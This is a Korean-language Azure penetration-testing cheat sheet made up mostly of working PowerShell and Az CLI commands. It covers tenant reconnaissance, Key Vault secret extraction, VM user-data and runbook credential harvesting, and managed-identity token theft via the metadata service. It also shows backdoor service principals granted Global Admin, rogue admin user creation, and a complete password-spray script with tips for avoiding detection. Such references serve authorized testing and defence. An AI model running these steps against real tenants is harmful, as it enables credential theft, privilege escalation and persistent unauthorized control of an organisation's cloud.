---
sidebar_position: 3
---

# Azure (Microsoft Azure)

## 기본 정보

Microsoft Azure는 마이크로소프트의 클라우드 컴퓨팅 플랫폼입니다. Office 365(O365)와 통합되어 기업 환경에서 많이 사용됩니다.

**주요 서비스:**
- **Azure AD**: 사용자 인증 및 디렉토리
- **Storage Account**: Blob, File, Queue 스토리지
- **Virtual Machine**: 가상 머신
- **Key Vault**: 비밀 정보 저장소
- **SQL Database**: 관리형 데이터베이스

**주요 도구:**
- **Az PowerShell**: PowerShell 모듈
- **Az CLI**: 명령줄 도구 (bash)
- **MSOnline**: 레거시 PowerShell 모듈

---

## 정찰 (Reconnaissance)

### 테넌트 ID 확인

```bash
https://login.microsoftonline.com/<target domain>/v2.0/.well-known/openid-configuration
```

**💡 설명:**
대상 도메인의 Azure AD 테넌트 ID를 확인합니다.

**📌 테넌트(Tenant)란?**
- Azure AD의 최상위 조직 단위
- 회사/조직당 하나의 테넌트
- 모든 사용자/리소스가 포함됨

**🎯 사용 시기:**
- 침투테스트 초기 정찰
- 조직의 Azure 사용 여부 확인
- 피싱 공격 준비

**예제:**
```bash
# Contoso 회사의 테넌트 ID 확인
https://login.microsoftonline.com/contoso.com/v2.0/.well-known/openid-configuration
```

### 페더레이션 정보 확인

```bash
https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&xml=1
```

**💡 설명:**
도메인이 페더레이션(ADFS 등)을 사용하는지 확인합니다.

**📌 페더레이션이란?**
- 온프레미스 AD와 Azure AD 연동
- 사용자 인증을 자체 서버에서 처리
- ADFS(Active Directory Federation Services) 사용

**📤 확인 사항:**
- `NameSpaceType`: Managed (클라우드) or Federated (온프레미스)
- `AuthURL`: 인증 서버 주소

**🎯 사용 시기:**
- 패스워드 스프레이 공격 전
- 인증 방식 확인

---

## Az PowerShell 모듈

### 모듈 로드

```powershell
Import-Module Az
```

**💡 설명:**
Azure PowerShell 모듈을 로드합니다.

**📌 설치 방법:**
```powershell
Install-Module -Name Az -AllowClobber -Scope CurrentUser
```

### 인증

```powershell
# 기본 로그인
Connect-AzAccount

# MFA 우회 시도 (자격증명 직접 입력)
$credential = Get-Credential
Connect-AzAccount -Credential $credential
```

**💡 설명:**
Azure 계정에 로그인합니다.

**📌 주요 옵션:**
- `-Credential`: 사용자명/비밀번호 객체
- `-Tenant`: 특정 테넌트 ID
- `-ServicePrincipal`: 서비스 주체로 로그인

**🎯 사용 시기:**
- Azure 리소스 접근 전 필수
- 자격증명 획득 후

**⚠️ MFA 우회:**
- `-Credential` 사용 시 일부 환경에서 MFA 우회 가능
- 레거시 인증 허용 시에만 작동

### 컨텍스트 파일 가져오기/내보내기

```powershell
# 컨텍스트 저장 (토큰 포함)
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# 컨텍스트 로드
Import-AzContext -Profile 'C:\Temp\StolenToken.json'
```

**💡 설명:**
Azure 인증 정보를 파일로 저장하거나 불러옵니다.

**📌 컨텍스트란?**
- 계정 정보 + 액세스 토큰
- 재로그인 없이 재사용 가능
- 다른 시스템에서도 사용 가능

**🎯 사용 시기:**
- 침투테스트 중 접근 유지
- 토큰 탈취
- 백도어 생성

**⚠️ 주의:**
- 토큰은 시간 제한 존재 (보통 1시간)
- 민감한 파일이므로 안전하게 저장

---

## 계정 정보

### 현재 컨텍스트 확인

```powershell
Get-AzContext -ListAvailable
```

**💡 설명:**
사용 가능한 모든 Azure 컨텍스트를 나열합니다.

**📤 출력 정보:**
- Account: 로그인한 계정
- Subscription: 구독 이름
- Tenant: 테넌트 ID

### 구독 목록

```powershell
Get-AzSubscription
```

**💡 설명:**
접근 가능한 모든 Azure 구독을 조회합니다.

**📌 구독(Subscription)이란?**
- Azure 리소스를 그룹화하는 단위
- 결제 단위
- 하나의 테넌트에 여러 구독 가능

**🎯 사용 시기:**
- 어떤 구독에 접근 가능한지 확인
- 구독별로 리소스 열거

### 구독 선택

```powershell
Select-AzSubscription -SubscriptionID "SubscriptionID"
```

**💡 설명:**
특정 구독으로 전환합니다.

**🎯 사용 시기:**
- 여러 구독이 있을 때
- 구독별로 리소스 조사

### 역할 할당 확인

```powershell
Get-AzRoleAssignment
```

**💡 설명:**
현재 사용자의 권한(역할)을 확인합니다.

**📤 주요 역할:**
- **Owner**: 모든 권한 (최고 권한)
- **Contributor**: 리소스 생성/수정 (역할 할당 제외)
- **Reader**: 읽기 전용
- **User Access Administrator**: 권한 관리만 가능

**🎯 사용 시기:**
- 권한 상승 가능 여부 확인
- 어떤 리소스에 접근 가능한지 파악

### 리소스 및 리소스 그룹 목록

```powershell
# 모든 리소스
Get-AzResource

# 리소스 그룹
Get-AzResourceGroup
```

**💡 설명:**
모든 Azure 리소스를 나열합니다.

**📌 리소스 그룹이란?**
- 관련된 리소스를 묶는 컨테이너
- VM, 스토리지, 네트워크 등을 함께 관리
- 프로젝트/환경별로 구분

### 스토리지 계정 목록

```powershell
Get-AzStorageAccount
```

**💡 설명:**
모든 Storage Account를 조회합니다.

**📤 출력 정보:**
- Storage Account 이름
- Location (리전)
- SKU (성능 계층)
- 퍼블릭 접근 여부

**🎯 사용 시기:**
- Blob 스토리지 탐색
- 민감 파일 검색

---

## Storage Account (스토리지)

Storage Account는 AWS의 S3와 유사한 객체 스토리지입니다.

### 주요 스토리지 타입

- **Blob Storage**: 대용량 파일 (이미지, 백업 등)
- **File Storage**: 파일 공유 (SMB 프로토콜)
- **Queue Storage**: 메시지 큐
- **Table Storage**: NoSQL 데이터

**🎯 공격 목표:**
- 퍼블릭 Blob 컨테이너 찾기
- 민감 정보 다운로드
- SAS 토큰 탈취

---

## Key Vault (비밀 저장소)

### Key Vault 목록

```bash
az keyvault list --query '[].name' --output tsv
```

**💡 설명:**
현재 계정이 볼 수 있는 모든 Key Vault를 나열합니다.

**📌 Key Vault란?**
- 비밀 정보를 안전하게 저장하는 서비스
- 비밀번호, API 키, 인증서 등 저장
- 애플리케이션이 안전하게 접근

**🎯 사용 시기:**
- 자격증명 탐색
- 데이터베이스 비밀번호 찾기
- API 키 추출

### Key Vault 권한 부여

```bash
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
```

**💡 설명:**
Contributor 권한이 있으면 자신에게 Key Vault 접근 권한을 부여할 수 있습니다.

**📌 주요 옵션:**
- `--name`: Key Vault 이름
- `--upn`: 사용자 이름 (User Principal Name)
- `--secret-permissions`: 비밀 권한 (get, list 등)

**🎯 사용 시기:**
- Contributor 권한은 있지만 Key Vault 접근 불가 시
- 권한 상승

### 비밀 목록 조회

```bash
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv
```

**💡 설명:**
Key Vault에 저장된 모든 비밀의 ID를 나열합니다.

### 비밀 값 추출

```bash
az keyvault secret show --id <URI from last command>
```

**💡 설명:**
비밀의 실제 값을 평문으로 조회합니다.

**📤 출력 형식:**
```json
{
  "value": "SuperSecretPassword123!"
}
```

**🎯 사용 시기:**
- 데이터베이스 접속 정보 획득
- API 키 탈취
- 다른 시스템 접근

---

## Virtual Machine (가상 머신)

### VM 목록

```powershell
Get-AzVM
```

**💡 설명:**
모든 가상 머신을 나열합니다.

**📤 출력 정보:**
- VM 이름
- Location
- 상태 (Running, Stopped)
- OS 타입 (Windows/Linux)

### VM 상세 정보

```powershell
$vm = Get-AzVM -Name "VM Name"
$vm.OSProfile
```

**💡 설명:**
특정 VM의 OS 프로필 정보를 조회합니다.

**📤 확인 사항:**
- Computer Name
- Admin Username
- OS 타입

### VM User Data 추출

```powershell
$subs = Get-AzSubscription
$fulllist = @()

Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $vms = Get-AzVM
    $list = $vms.UserData
    $list
    $fulllist += $list
}
$fulllist
```

**💡 설명:**
모든 구독의 VM User Data를 추출합니다.

**📌 User Data란?**
- VM 부팅 시 실행되는 스크립트
- 초기 설정, 소프트웨어 설치
- 비밀번호, 키가 포함될 수 있음

**🎯 사용 시기:**
- 자격증명 탐색
- 초기 설정 스크립트 분석

### VM에서 명령 실행

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

**💡 설명:**
VM에서 PowerShell 스크립트를 원격 실행합니다.

**📌 주요 옵션:**
- `-ResourceGroupName`: 리소스 그룹 이름
- `-VMName`: VM 이름
- `-CommandId`: 실행할 명령 타입
- `-ScriptPath`: 스크립트 파일 경로

**🎯 사용 시기:**
- Contributor 이상 권한 보유 시
- VM에서 코드 실행
- 권한 상승, 데이터 추출

**예제:**
```powershell
# 간단한 명령 실행
Invoke-AzVMRunCommand -ResourceGroupName "Production-RG" -VMName "WebServer01" -CommandId RunPowerShellScript -ScriptString "whoami; hostname"
```

---

## SQL Database

### SQL 서버 목록

```powershell
Get-AzSQLServer
```

**💡 설명:**
모든 Azure SQL 서버를 나열합니다.

**📤 출력 정보:**
- 서버 이름
- Location
- SQL 버전
- Admin 계정

### 데이터베이스 목록

```powershell
Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

**💡 설명:**
특정 SQL 서버의 모든 데이터베이스를 조회합니다.

### 방화벽 규칙 확인

```powershell
Get-AzSqlServerFirewallRule -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

**💡 설명:**
SQL 서버의 방화벽 규칙을 확인합니다.

**📤 확인 사항:**
- 허용된 IP 범위
- `0.0.0.0 - 255.255.255.255`: 모든 IP 허용 (위험!)
- 자신의 IP가 포함되는지 확인

**🎯 사용 시기:**
- SQL 서버 접근 가능 여부 확인
- 취약한 방화벽 설정 탐색

### SQL Server AD 관리자

```powershell
Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

**💡 설명:**
SQL 서버의 Azure AD 관리자를 확인합니다.

**🎯 사용 시기:**
- 관리자 계정 파악
- 권한 상승 대상 선정

---

## Automation Account (자동화)

### Runbook 목록

```powershell
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <AutomationAccountName> -ResourceGroupName <ResourceGroupName>
```

**💡 설명:**
Azure Automation Runbook을 조회합니다.

**📌 Runbook이란?**
- 자동화된 작업 스크립트
- PowerShell 또는 Python
- 스케줄러로 자동 실행
- **중요**: 관리 작업 자동화에 사용 → 높은 권한

**🎯 사용 시기:**
- 관리 스크립트 분석
- 자격증명 탐색
- 높은 권한의 작업 발견

### Runbook 내보내기

```powershell
Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\
```

**💡 설명:**
Runbook 스크립트를 로컬로 다운로드합니다.

**🎯 분석 대상:**
```powershell
# 다운로드 후 키워드 검색
Select-String -Path *.ps1 -Pattern "password|secret|key|token"
```

### 모든 Runbook 내보내기 (다중 구독)

```powershell
$subs = Get-AzSubscription

Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    mkdir .\$subscriptionid\
    Select-AzSubscription -Subscription $subscriptionid
    $runbooks = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName

    foreach ($i in $autoaccounts){
        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
    }

    foreach($r in $runbooks){
        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
    }
}
```

**💡 설명:**
모든 구독의 Runbook을 자동으로 수집합니다.

---

## MSOnline 모듈 (Azure AD)

### 모듈 로드 및 인증

```powershell
Import-Module MSOnline

# 로그인
Connect-MsolService

# MFA 우회 시도
$credential = Get-Credential
Connect-MsolService -Credential $credential
```

**💡 설명:**
MSOnline 모듈로 Azure AD에 연결합니다.

**📌 MSOnline이란?**
- 레거시 Azure AD PowerShell 모듈
- 사용자/그룹 관리
- 일부 기능은 최신 모듈에 없음

### 회사 정보

```powershell
Get-MSolCompanyInformation
```

**💡 설명:**
테넌트(조직)의 기본 정보를 조회합니다.

**📤 출력 정보:**
- 회사 이름
- 기술 연락처
- 국가/지역
- 라이선스 정보

### 사용자 목록

```powershell
# 모든 사용자
Get-MSolUser -All

# 사용자 속성 전부 보기
Get-MSolUser -All | fl
```

**💡 설명:**
모든 Azure AD 사용자를 나열합니다.

**📤 주요 속성:**
- UserPrincipalName
- DisplayName
- isLicensed
- LastPasswordChangeTimestamp

**🎯 사용 시기:**
- 사용자 열거
- 공격 대상 선정
- 패스워드 스프레이 준비

### 그룹 목록

```powershell
Get-MSolGroup -All
```

**💡 설명:**
모든 Azure AD 그룹을 조회합니다.

### 관리자 그룹 멤버

```powershell
# Global Admin 역할 확인
Get-MsolRole -RoleName "Company Administrator"

# 그룹 멤버 조회
Get-MSolGroupMember -GroupObjectId $GUID
```

**💡 설명:**
전역 관리자(Global Admin) 그룹의 멤버를 확인합니다.

**📌 Company Administrator = Global Administrator**
- Azure AD 최고 권한
- 모든 것에 접근 가능
- 주요 공격 타겟

**🎯 사용 시기:**
- 권한 상승 목표 설정
- 고가치 타겟 파악

### 서비스 주체 목록

```powershell
Get-MsolServicePrincipal
```

**💡 설명:**
모든 서비스 주체(Service Principal)를 조회합니다.

**📌 서비스 주체란?**
- 애플리케이션의 ID
- 자동화, API 접근에 사용
- 높은 권한을 가질 수 있음

### 사용자 속성에서 비밀번호 검색

```powershell
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}
```

**💡 설명:**
모든 사용자 속성에서 "password"라는 문자열을 검색합니다.

**🎯 발견 가능한 것:**
- 비밀번호 힌트
- 임시 비밀번호
- 비밀번호 정책 정보

---

## 백도어 (Backdoors)

### 서비스 주체 생성 (높은 권한 필요)

```powershell
# 새 서비스 주체 생성 (Owner 권한)
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn

# 비밀번호 추출
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret

# Global Admin 역할 추가
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# 서비스 주체로 로그인
$cred = Get-Credential  # AppID를 username, Secret을 password로 입력
Connect-AzAccount -Credential $cred -Tenant "tenant ID" -ServicePrincipal
```

**💡 설명:**
백도어 서비스 주체를 생성하여 지속적인 접근을 유지합니다.

**🎯 사용 목적:**
- 비밀번호 변경에도 접근 유지
- 탐지 회피 (일반 사용자가 아님)
- 높은 권한 유지

**⚠️ 주의:**
- Owner 이상 권한 필요
- 침투테스트 종료 후 삭제 필수

---

## 메타데이터 서비스 (IMDS)

### 메타데이터 URL

```bash
http://169.254.169.254/metadata
```

**💡 설명:**
Azure VM 내부에서 접근 가능한 메타데이터 서비스입니다.

**📌 AWS와의 차이:**
- URL에 `/metadata` 경로 필요
- `Metadata: true` 헤더 필수

### Managed Identity 토큰 획득

```powershell
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

**💡 설명:**
VM에 할당된 Managed Identity의 액세스 토큰을 획득합니다.

**📌 Managed Identity란?**
- VM에 자동으로 할당되는 ID
- 비밀번호 없이 Azure 리소스 접근
- SSRF로 악용 가능

**🎯 사용 시기:**
- VM 침투 후
- SSRF 취약점 발견 시
- 권한 상승

### 인스턴스 정보 조회

```powershell
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

**💡 설명:**
VM의 메타데이터 정보를 조회합니다.

**📤 제공 정보:**
- VM 이름
- Location
- OS 타입
- 네트워크 정보

---

## 서비스 주체 공격 경로

### 서비스 주체 자격증명 재설정

```bash
# 새 자격증명 생성
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>
```

**💡 설명:**
서비스 주체의 비밀번호를 재설정합니다.

**🎯 사용 시기:**
- 서비스 주체에 대한 권한이 있을 때
- 더 높은 권한의 서비스 주체 탈취

### 서비스 주체로 로그인

```bash
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
```

**💡 설명:**
서비스 주체 자격증명으로 Azure에 로그인합니다.

### 새 사용자 생성

```bash
az ad user create --display-name <display name> --password <password> --user-principal-name <full upn>
```

**💡 설명:**
테넌트에 새로운 사용자를 생성합니다.

**📌 주요 옵션:**
- `--display-name`: 표시 이름
- `--password`: 비밀번호
- `--user-principal-name`: 로그인 ID (예: john@contoso.com)

### Global Admin 권한 부여

```powershell
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```

**💡 설명:**
생성한 사용자에게 Global Admin 역할을 부여합니다.

**📌 Role Definition ID:**
- `62e90394-69f5-4237-9190-012177145e10`: Global Administrator

**🎯 공격 시나리오:**
1. 서비스 주체 탈취
2. 새 사용자 생성
3. Global Admin 권한 부여
4. 완전한 테넌트 장악

---

## 패스워드 스프레이

### 간단한 패스워드 스프레이 스크립트

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0
$count = $userlist.count

foreach($line in $userlist){
    $user = $line
    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
    $current = $linenumber + 1
    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
    $linenumber++
    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)

    try {
        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
    }
    catch {
        $Failure = $_.Exception
        if ($Failure -match "ID3242") {
            continue
        }
        else {
            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        }
    }
}
```

**💡 설명:**
사용자 목록과 비밀번호 목록을 사용하여 로그인을 시도합니다.

**📌 사용 방법:**
1. `userlist.txt`: 사용자 목록 (한 줄에 하나)
2. `passlist.txt`: 비밀번호 목록 (사용자와 동일한 순서)

**🎯 사용 시기:**
- ADFS 환경 (MFA 없음)
- 레거시 인증 활성화
- 사용자 목록 확보 시

**⚠️ 주의:**
- 계정 잠김 정책 확인
- 느린 속도로 실행 (탐지 회피)

---

## Azure 전용 도구

### MicroBurst

**설명:**
Azure 보안 평가 도구

**설치:**
```powershell
Install-Module -Name MicroBurst -Scope CurrentUser
Import-Module MicroBurst
```

**주요 기능:**
```powershell
# 공개 Blob 컨테이너 검색
Invoke-EnumerateAzureBlobs -Base $BaseName

# 비밀번호 및 인증서 추출
Get-AzPasswords -ExportCerts Y

# Azure Container Registry 덤프
Get-AzACR
```

**🎯 언제 사용?**
- 공개 스토리지 검색
- 자격증명 자동 추출
- 빠른 평가

---

### MSOLSpray

**설명:**
Azure/Office 365 패스워드 스프레이 도구

**설치:**
```powershell
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1
```

**사용법:**
```powershell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```

**🎯 언제 사용?**
- 패스워드 스프레이 공격
- 약한 비밀번호 테스트
- 대량 사용자 대상

---

### AzureHound

**설명:**
Azure AD 공격 경로 시각화 도구 (BloodHound와 유사)

**설치:**
```bash
git clone https://github.com/BloodHoundAD/AzureHound
```

**사용법:**
```bash
./azurehound -r "0.ARwA6Wg..." list --tenant "tenant ID" -v 2 -o output.json
```

**💡 설명:**
Refresh Token으로 Azure AD 구조를 수집하여 공격 경로를 찾습니다.

**🎯 언제 사용?**
- 복잡한 Azure AD 환경
- 권한 상승 경로 탐색
- 시각적 분석 필요 시

---

### PowerZure

**설명:**
Azure 침투테스트 프레임워크

**설치:**
```powershell
Install-Module -Name PowerZure
Import-Module PowerZure
```

**🎯 언제 사용?**
- 종합적인 Azure 평가
- 자동화된 공격

---

### ROADTools

**설명:**
Azure AD 상호작용 프레임워크

**설치:**
```bash
pip install roadrecon
```

**🎯 언제 사용?**
- Azure AD 데이터 수집
- 오프라인 분석

---

## 참고

### 주요 명령어 요약 (PowerShell)

- `Connect-AzAccount`: Azure 로그인
- `Get-AzResource`: 리소스 목록
- `Get-AzStorageAccount`: 스토리지 계정
- `Get-AzVM`: 가상 머신
- `Get-MSolUser -All`: 모든 사용자

### 주요 명령어 요약 (Az CLI)

- `az login`: Azure 로그인
- `az keyvault list`: Key Vault 목록
- `az ad user create`: 사용자 생성
- `az ad sp credential reset`: 서비스 주체 재설정

### 권한 상승 체크리스트

1. Contributor → Key Vault 접근 권한 부여
2. 서비스 주체 자격증명 재설정
3. Managed Identity 토큰 탈취 (IMDS)
4. Runbook에서 자격증명 추출
5. VM User Data에서 비밀번호 찾기

### 차이점: AWS vs Azure

| 항목 | AWS | Azure |
|------|-----|-------|
| ID 관리 | IAM | Azure AD |
| 스토리지 | S3 | Blob Storage |
| VM | EC2 | Virtual Machine |
| 비밀 저장소 | Secrets Manager | Key Vault |
| 메타데이터 | 169.254.169.254/latest/meta-data | 169.254.169.254/metadata |

---

## 관련 도구

- [MicroBurst](https://github.com/NetSPI/MicroBurst) - Azure 보안 평가
- [PowerZure](https://github.com/hausec/PowerZure) - Azure 침투테스트
- [ROADTools](https://github.com/dirkjanm/ROADtools) - Azure AD 프레임워크
- [AzureHound](https://github.com/BloodHoundAD/AzureHound) - 공격 경로 시각화
- [MSOLSpray](https://github.com/dafthack/MSOLSpray) - 패스워드 스프레이
- [Stormspotter](https://github.com/Azure/Stormspotter) - Azure 그래프 도구
